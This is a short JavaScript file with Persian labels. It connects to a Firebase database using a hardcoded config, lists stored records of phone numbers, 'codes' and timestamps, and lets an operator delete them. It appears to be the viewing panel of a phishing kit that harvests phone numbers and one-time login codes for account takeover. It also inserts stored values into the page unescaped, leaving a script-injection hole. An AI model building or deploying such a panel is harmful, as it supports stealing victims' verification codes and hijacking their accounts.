import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";


const firebaseConfig = {
  apiKey: "AIzaSyAUPnkLgHdNw2jXRe76gQ113_6aCiAFtXo",
  authDomain: "la3nazr.firebaseapp.com",
  databaseURL: "https://la3nazr-default-rtdb.firebaseio.com",
  projectId: "la3nazr",
  storageBucket: "la3nazr.firebasestorage.app",
  messagingSenderId: "819824551752",
  appId: "1:819824551752:web:87e8a2555c6df97edeb57d",
  measurementId: "G-F9F9YTF2HC"
};


const app = initializeApp(firebaseConfig);
const db = getDatabase(app);


const usersRef = ref(db, "users");


onValue(usersRef, (snapshot)=>{

    let data = snapshot.val();

    let box = document.getElementById("users");

    box.innerHTML = "";


    if(data){

        Object.keys(data).forEach(id=>{

            let user = data[id];


            box.innerHTML += `

            <div class="user">

            <p>📱 شماره: ${user.phone}</p>

            <p>🔑 کد: ${user.code}</p>

            <p>⏰ زمان: ${user.time}</p>


            <button onclick="deleteUser('${id}')">
            حذف
            </button>

            </div>

            `;

        });

    }else{

        box.innerHTML="اطلاعاتی وجود ندارد";

    }


});


window.deleteUser = function(id){

    if(confirm("حذف شود؟")){

        remove(ref(db,"users/"+id));

    }

                                  }
